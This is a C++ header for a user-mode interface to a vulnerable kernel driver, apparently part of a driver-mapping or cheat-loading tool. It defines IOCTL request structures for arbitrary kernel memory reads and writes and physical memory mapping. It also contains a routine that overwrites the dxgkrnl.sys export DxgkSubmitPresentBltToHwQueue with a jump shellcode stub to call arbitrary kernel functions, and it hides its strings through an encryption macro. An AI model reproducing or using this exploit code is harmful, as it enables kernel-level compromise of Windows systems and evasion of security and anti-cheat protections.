#include <Windows.h>
#include <iostream>
#include <vector>

#include "nt.hpp"
#include "..\Crypter.hpp"

constexpr uintptr_t iotctl = 0x80862007;

typedef struct _WRITE_REQUEST
{
	const uint64_t code = 0x33;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t size;
} WriteRequest, * PWriteRequest;

typedef struct _GET_PHYSICAL_REQUEST
{
	const uint64_t code = 0x25;
	uint64_t reserved;
	uint64_t pa;
	uint64_t va;
} GetPhysicalRequest, * PGetPhysicalRequest;

typedef struct _MAP_IO_REQUEST
{
	const uint64_t code = 0x19;
	uint64_t reserved;
	uint64_t reserved2;
	uint64_t out_base_va;
	uint64_t in_pa;
	uint32_t size;
} MapIoRequest, * PMapIoRequest;

typedef struct _UNMAP_IO_REQUEST
{
	const uint64_t code = 0x1A;
	uint64_t reserved;
	uint64_t reserved2;
	uint64_t in_base_va;
	uint64_t reserved3;
	uint32_t size;
} UnMapIoRequest, * PUnMapIoRequest;

class KeInterface
{
	HANDLE hDriver;

	bool getPhysicalMemory(uintptr_t virtual_address, uintptr_t* out_physical_address);
	bool mapIoSpace(uintptr_t physical_address, uint32_t size, uintptr_t* out_virtual_address);
	bool unMapIoSpace(uintptr_t base_virtual_address, uint32_t size);
	bool writeReadOnlyMemory(uintptr_t source, uintptr_t destination, uintptr_t size);

public:

	KeInterface();
	bool writeMemory(uintptr_t source, uintptr_t destination, uint64_t size);
	bool cleanUp();
	uintptr_t getKernelModuleBase(const char* name);
	uintptr_t getModuleExport(const char* module_name, uintptr_t module_base);

	template <typename T>
	T rm(uintptr_t destination)
	{
		T buffer;
		writeMemory(destination, (uintptr_t)&buffer, sizeof(buffer));

		return buffer;
	}

	template <class T>
	bool wm(T* buffer, uintptr_t destination)
	{
		return writeMemory((uintptr_t)buffer, destination, sizeof(T));
	}

	template<typename T, typename ...A>
	bool callFunction(const char* module_name, const char* export_name, T* ret_val, A... args)
	{
		uintptr_t module_address = getKernelModuleBase(module_name);
		if (!module_address)
			return false;
		uintptr_t export_address = getModuleExport(export_name, module_address);
		if (!export_address)
			return false;

		return callFunction(export_address, ret_val, args...);
	}

	template<typename T, typename ...A>
	bool callFunction(uintptr_t function, T* ret_val, A... args)
	{
		uintptr_t dxg_base = getKernelModuleBase(EncryptS("dxgkrnl.sys"));
		uintptr_t ntFuncHook = getModuleExport(EncryptS("DxgkSubmitPresentBltToHwQueue"), dxg_base);

		if (!ntFuncHook)
			return false;
		::byte shell_code[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		*(uintptr_t*)&shell_code[2] = function;
		::byte original_bytes[sizeof(shell_code)];
		writeMemory(ntFuncHook, (uintptr_t)&original_bytes, sizeof(original_bytes));
		if (!writeReadOnlyMemory((uintptr_t)shell_code, ntFuncHook, sizeof(shell_code)))
			return false;

		HMODULE win32Dll = LoadLibraryA(EncryptS("win32u.dll"));
		if (win32Dll)
		{
			void* dxg_hook = (void*)GetProcAddress(win32Dll, EncryptS("NtDxgkSubmitPresentBltToHwQueue"));
			*ret_val = funcTemplate<T>(dxg_hook, args...);
			FreeLibrary(win32Dll);
		}

		if (!writeReadOnlyMemory((uintptr_t)original_bytes, ntFuncHook, sizeof(shell_code)))
			std::cout << EncryptS(" ") << std::endl;

		return win32Dll;
	}

	template<typename T, typename ...E>
	T funcTemplate(void* address, E ...args)
	{
		return ((T(*)(E...))(address))(args...);
	}

};